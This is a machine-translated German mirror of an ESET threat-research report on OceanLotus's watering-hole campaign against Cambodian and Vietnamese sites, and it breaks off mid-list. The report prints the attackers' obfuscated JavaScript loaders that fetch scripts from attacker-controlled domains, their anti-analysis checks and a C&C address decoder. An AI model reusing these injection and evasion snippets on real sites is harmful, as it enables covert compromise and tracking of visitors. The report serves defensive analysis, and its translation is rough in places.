<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§ôüèª üö† üêÄ OceanLotus: Wasserlochangriff in S√ºdostasien ‚öíÔ∏è ü§® üôÜüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ESET-Spezialisten analysierten die neue Wasserlochkampagne, die auf mehrere Standorte in S√ºdostasien abzielt. Angeblich sind die Angreifer seit Anfang...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>OceanLotus: Wasserlochangriff in S√ºdostasien</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/436136/">  ESET-Spezialisten analysierten die neue Wasserlochkampagne, die auf mehrere Standorte in S√ºdostasien abzielt.  Angeblich sind die Angreifer seit Anfang September 2018 im Einsatz.  Die Kampagne ist unterschiedlich umfangreich - wir haben 21 gef√§hrdete Ressourcen entdeckt, darunter die Websites des kambodschanischen Verteidigungsministeriums, des Ministeriums f√ºr ausw√§rtige Angelegenheiten und internationale Zusammenarbeit in Kambodscha sowie mehrere vietnamesische Zeitungen und Blogs. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div> <br>  Basierend auf der Analyse haben wir festgestellt, dass die Kampagne von der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">OceanLotus-</a> Gruppe, auch bekannt als <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ART32</a> und ART-S-00, durchgef√ºhrt wird.  Die Gruppe ist seit mindestens <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">2012 t√§tig</a> und auf Cyberspionage spezialisiert, mit besonderem Interesse an Regierungsbeh√∂rden und Dissidenten. <br><br><a name="habracut"></a>  Die Kampagne scheint eine Weiterentwicklung des OceanLotus-Wasserlochschemas zu sein, das Volexity-Forscher 2017 unter dem Namen Framework B <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dokumentiert haben</a> . Seit letztem Jahr hat die Cybergroup gelernt, die Analyse ihrer b√∂sartigen Frameworks zu erschweren.  Unter anderem haben wir die Verwendung der Verschl√ºsselung mit √∂ffentlichen Schl√ºsseln f√ºr den Austausch des AES-Sitzungsschl√ºssels festgestellt.  Die Methode wird zum Verschl√ºsseln des Datenaustauschs verwendet, bei dem Sicherheitsprodukte die endg√ºltige Nutzlast nicht abfangen k√∂nnen.  Dar√ºber hinaus haben Angreifer von HTTP zu WebSocket gewechselt, um den Austausch b√∂swilliger Daten zu verbergen. <br><br>  Jede der von ESET-Experten entdeckten gef√§hrdeten Websites leitete Besucher zu einer separaten Domain weiter, die von OceanLotus kontrolliert wird. <br><br>  Das Bild unten zeigt die Zielregionen der Kampagne. <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>Abbildung 1. Geografie gef√§hrdeter Standorte</i> <br><br>  Die meisten kompromittierten Domains sind Nachrichtenmedien oder mit der Regierung von Kambodscha verwandt.  Das Folgende ist eine Liste der Opfer.  Wir haben sie vor Kompromissen im Oktober gewarnt, aber Ende 2018 blieben auf einigen Websites sch√§dliche Skripte: <br><br>  - baotgm [.] Net - Vietnamesische Medien (Hauptsitz in Arlington, Texas) <br>  - cnrp7 [.] Org - Website der Nationalen Heilspartei von Kambodscha <br>  - conggiaovietnam [.] Netzreligi√∂ser Inhalt auf Vietnamesisch <br>  - daichungvienvinhthanh [.] Kom - religi√∂ser Inhalt auf Vietnamesisch <br>  - danchimviet [.] Info - Vietnamesische Medien <br>  - danviet [.] Vn - Vietnamesische Medien <br>  - danviethouston [.] Com - Vietnamesische Medien <br>  - fvpoc [.] Org - Vietnamesische √∂ffentliche Organisation <br>  - gardencityclub [.] Com - Golfclub in Phnom Penh, Kambodscha <br>  - lienketqnhn [.] Org - Vietnamesische Medien <br>  - mfaic.gov [.] Kh - Ministerium f√ºr ausw√§rtige Angelegenheiten und internationale Zusammenarbeit Kambodschas <br>  - mod.gov [.] Kh - Verteidigungsministerium von Kambodscha <br>  - mtgvinh [.] Netzreligi√∂ser Inhalt auf Vietnamesisch <br>  - nguoitieudung.com [.] Vn - Vietnamesische Medien <br>  - phnompenhpost [.] Com - Kambodschanische Medien in englischer Sprache <br>  - raovatcalitoday [.] Com - Site auf Vietnamesisch <br>  - thongtinchongphandong [.] Oppositionsmedien auf Vietnamesisch <br>  - tinkhongle [.] Com - Vietnamesische Medien <br>  - toithichdoc.blogspot [.] Com - Vietnamesischer Blog <br>  - trieudaiviet [.] Com - Site auf Vietnamesisch <br>  - triviet [.] News - Vietnamesische Medien <br><br>  Bei Wasserlochangriffen gef√§hrden Angreifer in der Regel Standorte, die h√§ufig von potenziellen Opfern besucht werden.  In dieser Kampagne hat die OceanLotus-Gruppe jedoch mehrere beliebte Websites kompromittiert.  Nachfolgend finden Sie eine Liste der gef√§hrdeten Websites und deren <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Alexa-Bewertung</a> : global und in dem Land, in dem die Website am beliebtesten ist.  Zum Beispiel war die Website der Zeitung Dan Viet (danviet [.] Vn) Ende 2018 in Bezug auf die Besucherzahlen in Vietnam in der 116. Zeile. <br><br>  - danviet [.] Vn - 12 887/116 <br>  - phnompenhpost [.] Com - 85 910/18 880 <br>  - nguoitieudung.com [.] Vn - 261 801/2 397 <br>  - danchimviet [.] Info - 287 852/144 884 <br>  - baotgm [.] Net - 675 669/119 737 <br>  - toithichdoc.blogspot [.] Com - 700 470/11532 <br>  - mfaic.gov [.] Kh - 978 165/2 149 <br>  - conggiaovietnam [.] Net - 1.040 548/15 368 <br>  - thongtinchongphandong [.] Com - 1 134 691/21 575 <br>  - Tinkhongle [.] Com - 1 301 722/15 224 <br>  - daichungvienvinhthanh [.] Com - 1.778.418 / 23.428 <br>  - mod.gov [.] Kh - 4,247,649 / 3,719 <br><br><h3>  Analyse </h3><br>  F√ºr alle gef√§hrdeten Standorte wurden √§hnliche Methoden verwendet.  Angreifer haben der Hauptseite oder einer auf demselben Server ver√∂ffentlichten JavaScript-Datei einen kleinen Teil des JavaScript-Codes hinzugef√ºgt.  Ein leicht verschleiertes Codefragment (siehe unten) l√§dt ein anderes Skript von einem vom Angreifer kontrollierten Server.  Unten finden Sie ein JavaScript-Snippet, das zu <code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code> und die Datei von <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> herunterl√§dt <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> . <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br>  Um eine Entdeckung zu vermeiden, haben die Angreifer die folgenden Ma√ünahmen ergriffen: <br><br>  - Sie verschleiern Skripte, um zu verhindern, dass statische endg√ºltige URLs zugewiesen werden <br>  - Die URL sieht aus wie die echte JavaScript-Bibliothek, die von der Site verwendet wird <br>  - F√ºr jede gef√§hrdete Site werden eine separate Dom√§ne und ein separater URI verwendet. <br>  - Alle gef√§hrdeten Websites haben unterschiedliche Skripte.  Das folgende Skript wird auf einer der gef√§hrdeten Sites implementiert: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3>  Erste Stufe </h3><br>  Abh√§ngig vom Speicherort der IP-Adresse des Besuchers <code>weblink.selfip[.]info</code> der Server der ersten Stufe (z. B. <code>weblink.selfip[.]info</code> f√ºr <code>mfaic.gov[.]kh</code> ) ein falsches Skript (zuf√§llige legitime JavaScript-Bibliothek) oder ein Skript der ersten Stufe (z. B. SHA-) 1: 2194271C7991D60AE82436129D7F25C0A689050A).  Nicht alle Server f√ºhren Standortpr√ºfungen durch. Wenn jedoch einer vorhanden ist, erhalten nur Besucher aus Vietnam und Kambodscha ein sch√§dliches Skript. <br><br>  Das Skript der ersten Stufe verf√ºgt √ºber mehrere √úberpr√ºfungen, um die Erkennung zu verhindern, wie unten gezeigt. <br><br><pre> <code class="javascript hljs">[‚Ä¶] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } [‚Ä¶]</code> </pre> <br>  Das Skript wartet, bis das Opfer zur Seite gescrollt hat.  Au√üerdem wird die Fensteraufl√∂sung √ºberpr√ºft und gepr√ºft, ob Firebug, ein browserbasiertes Plugin zur Analyse von Webseiten, aktiviert ist.  Wenn mindestens eine der Pr√ºfungen fehlschl√§gt, wird die Ausf√ºhrung beendet. <br><br>  Anschlie√üend entschl√ºsselt er die Dom√§ne des C &amp; C-Befehlsservers mithilfe eines benutzerdefinierten Algorithmus.  Beispielsweise steht 3B37371M1B1B382R332V1A382W36392W2T362T1A322T38 f√ºr <code>wss://tcog.thruhere[.]net</code> .  F√ºr jede Dom√§ne der ersten Stufe haben die Angreifer zus√§tzlich eine Dom√§ne der zweiten Stufe registriert, und alle befinden sich auf verschiedenen Servern.  Der folgende Code entspricht der in Python geschriebenen Entschl√ºsselungsfunktion. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br>  Nach dem Entschl√ºsseln der C &amp; C-Adresse sendet das Skript eine eindeutige Zeichenfolge mit 15 Ziffern und empf√§ngt das Skript der zweiten Stufe und f√ºhrt es aus.  Der Datenaustausch erfolgt √ºber WebSocket oder SSL.  Das Protokoll erm√∂glicht die gleichzeitige bidirektionale Kommunikation zwischen Client und Server.  Dies bedeutet, dass der Server, nachdem ein Client eine Verbindung hergestellt hat, auch ohne Anforderung Daten an den Client senden kann.  In einem bestimmten Fall wird das Protokoll jedoch haupts√§chlich verwendet, um eine Erkennung zu vermeiden. <br><br><h3>  Zweite Stufe </h3><br>  Das Drehbuch der zweiten Stufe dient der Aufkl√§rung.  Die Entwickler von OceanLotus verwendeten die auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GitHub</a> verf√ºgbare Fingerprintjs2-Bibliothek von Valve mit geringf√ºgigen √Ñnderungen - Hinzuf√ºgen der Netzwerkfreigabe und Erstellen eines speziellen Berichts. <br><br>  Die folgende Abbildung zeigt die verschiedenen vom Skript ausgef√ºhrten Aktionen.  Die Kommunikation erfolgt √ºber eine WebSocket-Sitzung, die mit dem ersten Schritt begonnen hat. <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>Abbildung 2. Schema der zweiten Stufe der Nutzlast</i> <br><br>  Die Kommunikation wird mit dem vom Server generierten AES-Sitzungsschl√ºssel verschl√ºsselt.  Es wird mit einem √∂ffentlichen 1024-Bit-RSA-Schl√ºssel verschl√ºsselt und an den Client gesendet, sodass der Datenaustausch zwischen Client und Server nicht entschl√ºsselt werden kann. <br><br>  Im Vergleich zu fr√ºheren Versionen des OceanLotus-Frameworks f√ºr Wasserl√∂cher ist es schwieriger, sich davor zu sch√ºtzen, da die Daten√ºbertragung √ºber das Netzwerk nicht erkannt und entschl√ºsselt werden kann.  Dies verhindert die Netzwerkerkennung von Daten.  Der vom Server √ºbertragene √∂ffentliche Schl√ºssel √§ndert sich nicht und ist im Abschnitt IoC aufgef√ºhrt. <br><br>  Das Aufkl√§rungsskript erstellt einen Bericht √§hnlich dem folgenden und sendet ihn an den C &amp; C-Server der zweiten Stufe. <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br>  Dieser Bericht ist fast identisch mit dem anderen, der vom <a href="">OceanLotus Framework B</a> erstellt wurde und 2017 von Volexity dokumentiert wurde.  Ihre Abschnitte sind √§hnlich und enthalten identische Tippfehler.  Aufgrund dieser √Ñhnlichkeit und Lage der Ziele k√∂nnen wir mit hoher Sicherheit sagen, dass OceanLotus die Kampagne durchf√ºhrt. <br><br>  Der generierte Bericht enth√§lt detaillierte Informationen zum Browser des Opfers und zur besuchten Site: Benutzeragent, HTTP-Referer-Anforderungsheader, lokale und externe IP-Adresse, Plug-Ins und Einstellungen f√ºr die Browsersprache. <br><br>  Dar√ºber hinaus verf√ºgt jeder Computer √ºber zwei eindeutige Kennungen: <i>client_zuuid</i> und <i>client_uuid</i> .  Sie k√∂nnen verwendet werden, um Benutzer zu identifizieren und ihre Besuche zu verfolgen.  Diese Bezeichner waren in der Version 2017 des Frameworks tats√§chlich vorhanden, und <i>client_uuid wurde</i> auf √§hnliche Weise berechnet. <br><br>  Der Wert von <i>client_zuuid</i> ist die Verkettung der verschiedenen Ger√§te-ID-Werte in navigator.mediaDevices.enumerateDevices.  Ger√§te sind externe Ger√§te, auf die der Browser Zugriff hat, z. B. Kameras und Mikrofone.  Daher muss der Wert f√ºr einen Benutzer bei verschiedenen Besuchen auf demselben Computer √ºbereinstimmen. <br><br>  Der Wert <i>client_uuid</i> ist der MD5-Hash der von fingerprintjs2 zugewiesenen Fingerabdr√ºcke.  Die gesammelten Daten umfassen den Browser-Benutzeragenten, die Sprache, die Zeitzone, Browser-Plug-Ins und √ºber den Browser zug√§ngliche Schriftarten.  Und wieder - der Wert sollte f√ºr alle Besuche nur dann identisch sein, wenn der Benutzer beispielsweise den Browser nicht aktualisiert oder sich nicht von einem anderen Ger√§t aus anmeldet. <br><br>  Schlie√ülich kann der Server zus√§tzlichen JavaScript-Code an den Computer des Opfers senden. M√∂glicherweise ist dies die gelieferte Komponente.  Leider konnten wir aufgrund der Verwendung des AES-Sitzungsschl√ºssels zum Entschl√ºsseln des Datenaustauschs nicht feststellen, welche Komponente von Eindringlingen in In-the-Wild-Proben bereitgestellt wird.  Au√üerdem wird die Nutzlast nur an bestimmte Opfer geliefert.  Daher konnten wir sie mit einer Testmaschine nicht bekommen.  Laut fr√ºheren Berichten zielen die Wasserlochkampagnen von OceanLotus jedoch auf Phishing ab.  Zum Beispiel schrieb Volexity in einem Bericht <a href="">,</a> dass Benutzer ein Popup-Fenster sahen, in dem sie aufgefordert wurden, den Zugriff √ºber das offene OAuth-Protokoll auf das Google-Konto des Opfers f√ºr die OceanLotus-Google-App zu autorisieren.  Mit dieser Technik k√∂nnen Angreifer auf die Kontakte und E-Mails des Opfers zugreifen. <br><br><h3>  Netzwerkinfrastruktur </h3><br>  F√ºr maximale verdeckte Arbeit haben die OceanLotus-Betreiber f√ºr jede der gef√§hrdeten Sites eine Domain f√ºr die erste und zweite Stufe registriert.  Jede Domain wird auf einem separaten Server mit einer eigenen IP-Adresse gehostet.  F√ºr diese Kampagne sind mindestens 50 Domains und 50 Server registriert. <br><br>  Die meisten Domains der ersten Stufe sind f√ºr Dienste mit kostenlosen Domainnamen registriert, Domains der zweiten Stufe werden haupts√§chlich bezahlt.  Unter anderem werden ihre Namen als legitim getarnt.  Unten finden Sie eine Liste der Dienste, die Angreifer zu kopieren versucht haben - C &amp; C bzw. eine legitime Domain: <br><br>  - cdn-ampproject [.] Com / 